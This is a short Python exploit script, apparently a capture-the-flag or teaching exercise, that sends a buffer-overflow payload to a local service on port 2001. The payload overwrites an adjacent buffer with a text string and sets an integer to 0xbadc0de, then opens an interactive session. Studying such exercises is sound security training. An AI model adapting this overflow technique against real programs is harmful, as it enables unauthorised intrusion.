#!/usr/bin/python3

import socket
import telnetlib

s = socket.create_connection(('localhost', 2001))

# Fill up buffer1 (32 bytes)
# Write the text into buffer2
buff1 = b'a'*32 + b'I can use buffer overflows!'
# Write until the end of buffer2 (text = 27, size = 40 => need 13 more)
# Write the correct code into the int
buff1 += b'\x00'*13 + 0xbadc0de.to_bytes(8, 'little')
buff1 += b'\n'
s.send(buff1)

t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()
